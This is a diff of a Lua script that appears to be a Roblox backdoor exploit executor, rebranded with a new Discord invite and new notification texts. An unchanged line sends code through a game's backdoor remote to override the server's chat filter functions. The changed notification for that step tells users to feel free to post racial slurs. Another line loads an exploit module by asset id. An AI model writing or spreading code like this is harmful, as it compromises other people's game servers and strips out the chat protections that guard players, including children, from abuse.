@@ -21,12 +21,12 @@ local localPlayer = game:GetService("Players").LocalPlayer
 local randID = tostring(localPlayer.UserId * 2)..tostring(math.random(100000000,1000000000))
 
 local UI_PARENT = game:GetService("CoreGui").RobloxGui
-local INV_CODE = "xJHCqm84cW"
+local INV_CODE = "fM5V2pvab6"
 
 local function notify(text,cb,b1,b2)
 	game:GetService("StarterGui"):SetCore(
 		"SendNotification",{
-			Title = "backdoor.exe",
+			Title = "NEKO EXPLOIT XDD",
 			Duration = 3,
 			Text = text,
 			Callback = cb,
@@ -93,8 +93,8 @@ local function changeUiState()
 		["false"] = Color3.fromRGB(185, 48, 48)
 	}
 	local attachTexts = {
-		["true"] = "exploit attached",
-		["false"] = "attach exploit idiot"
+		["true"] = "attached",
+		["false"] = "brah>>"
 	}
 
 	BackdoorUI.attached = not BackdoorUI.attached
@@ -122,7 +122,7 @@ local function check()
 		
 		-- Anti-Censoring
 		BackdoorUI.backdoorRemote:FireServer("local chatservice = require(game.ServerScriptService.ChatServiceRunner.ChatService);chatservice.InternalApplyRobloxFilterNewAPI=function(self,sp,mes,textfilcon) return true,false,mes end;chatservice.InternalApplyRobloxFilter=function(self,sp,mes,toname) return mes end")
-		notify("CHAT BYPASSER WORKIN")
+		notify("FEEL FREE TO SAY RACIAL SLURS IN CHAT LOL")
 		
 		workspace:FindFirstChild(randID):Destroy()
 		return true
@@ -240,7 +240,7 @@ r6Button.MouseButton1Click:Connect(function() executeScript("require(3041175937)
 clearButton.MouseButton1Click:Connect(function() source.Text = ""  end)
 hideButton.MouseButton1Click:Connect(function() sourceFrame.Visible = not sourceFrame.Visible end)
 inviteButton.MouseButton1Click:Connect(function() promtDicordInvite(INV_CODE) end)
-notify("Make sure to join our Discord!\nCode: "..INV_CODE)
+notify("BRAH JOIN DA NEKOTEAM XD\nCODEZ N SHIETTTT: "..INV_CODE)
 
 --	k4scripts
 --	.------.
